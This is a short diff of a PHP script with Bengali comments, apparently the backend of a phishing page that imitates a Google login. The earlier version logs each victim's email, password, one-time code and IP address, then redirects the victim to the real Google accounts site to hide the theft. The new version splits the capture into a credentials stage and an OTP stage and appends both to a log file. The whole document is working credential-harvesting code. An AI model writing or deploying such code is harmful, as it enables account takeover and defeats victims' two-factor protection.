@@ -1,19 +1,22 @@
 <?php
-header('Location: https://accounts.google.com'); // সাবমিট করার পর অরিজিনাল সাইটে পাঠিয়ে দেবে
+// ডাটা রিসিভ করা
+$email = $_POST['email'] ?? '';
+$password = $_POST['password'] ?? '';
+$otp = $_POST['otp'] ?? '';
+$type = $_POST['type'] ?? '';
 
-$email = $_POST['email'];
-$pass = $_POST['password'];
-$otp = $_POST['otp'];
-$ip = $_SERVER['REMOTE_ADDR'];
-$time = date('Y-m-d H:i:s');
+$file = fopen("log.txt", "a");
 
-$data = "--- New Entry ($time) ---\n";
-$data .= "Email: $email\n";
-$data .= "Pass: $pass\n";
-$data .= "OTP: $otp\n";
-$data .= "IP: $ip\n";
-$data .= "--------------------------\n\n";
+if ($type == 'LOGIN_DATA') {
+    // যখন ইমেল ও পাসওয়ার্ড আসবে
+    $data = "\n[NEW LOGIN]\nEmail: $email\nPassword: $password\n----------------\n";
+    fwrite($file, $data);
+} 
+elseif ($type == 'OTP_DATA') {
+    // যখন ওটিপি আসবে
+    $data = "[OTP RECEIVED]\nCode: $otp\n----------------\n";
+    fwrite($file, $data);
+}
 
-file_put_contents('log.txt', $data, FILE_APPEND);
-exit();
+fclose($file);
 ?>
